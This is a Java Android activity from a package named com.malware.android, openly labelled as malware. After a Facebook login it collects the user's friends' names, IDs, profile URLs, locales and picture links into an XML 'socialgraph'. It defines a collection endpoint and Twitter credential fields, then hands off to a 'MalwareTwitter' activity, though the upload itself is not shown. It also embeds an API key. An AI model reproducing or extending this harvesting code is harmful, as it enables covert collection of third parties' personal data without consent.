package com.malware.android;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Iterator;
import java.util.List;

import net.xeomax.FBRocket.FBRocket;
import net.xeomax.FBRocket.Facebook;
import net.xeomax.FBRocket.Friend;
import net.xeomax.FBRocket.LoginListener;
import net.xeomax.FBRocket.ServerErrorException;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MalwareFacebook extends Activity implements LoginListener{

	Context context;
	ProgressDialog dialog = null;
	String twitter_user = null;
	String twitter_pass = null;
	String encoded_xml = null;

	private FBRocket fbRocket;
	private String API_KEY = "f3c8e8a17c413596360af00a31452c29";
	private String POST_URL = "http://car-pooler.appspot.com/storefacebookfriends";
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		context = this;

		Bundle b = this.getIntent().getExtras();

		fbRocket = new FBRocket(this, "Facebook Login", API_KEY);
		/*
		 * do this properly later.

		if (fbRocket.existsSavedFacebook()) {
			fbRocket.loadFacebook();
		}

		else
		 */ 
		{
			fbRocket.login(R.layout.facebookreturn);
		}
	}

	public void onLoginFail() {
		fbRocket.displayToast("Login failed!");
	}

	public void onLoginSuccess(final Facebook facebook) {

		fbRocket.displayToast("Login success!");

		Thread facebookThread =  new Thread(new Runnable() {
			@SuppressWarnings("deprecation")
			public void run() {

				/*
				 * Pull data from Facebook here and upload
				 * to app engine
				 */
				StringWriter writer = new StringWriter();
				PrintWriter out = new PrintWriter(writer);

				List<String> friend_uid = null;
				try 
				{
					friend_uid = facebook.getFriendUIDs();
				} 
				catch (ServerErrorException e) {

					e.printStackTrace();
				}
				String []aaa = new String [friend_uid.size()];
				friend_uid.toArray(aaa);

				List<Friend> friends = null;
				try 
				{
					friends = facebook.getFriends(aaa);
				} catch (ServerErrorException e) 
				{
					e.printStackTrace();
				}

				Iterator<Friend> iterator = friends.iterator();

				out.println("<socialgraph>");
				out.println("<facebook>");

				int count = 0;
				while (iterator.hasNext()){

					count++;
					out.println("<friend>");

					Friend f = iterator.next();
					String fName = f.name;
					out.println("<name>"+fName+"</name>");

					String fUid= f.uid;
					out.println("<uid>"+fUid+"</uid>");

					String fProfile = f.profile_url;
					out.println("<profileurl>"+fProfile+"</profileurl>");

					String fLocale = f.locale;
					out.println("<locale>"+fLocale+"</locale>");

					String fPicture = f.pic;
					out.println("<picture>"+fPicture+"</picture>");

					out.println("</friend>");

				}

				out.println("</facebook>");
				out.println("</socialgraph>");
				out.close();
                String prof_xml = writer.toString();

				dialog.cancel();
				Intent myIntent = new Intent(context, MalwareTwitter.class);
				startActivity(myIntent);
			}
		});

		facebookThread.start();
		dialog = ProgressDialog.show(context, "", 
				"Getting your profile information. This might take a while...", true);

	}
}
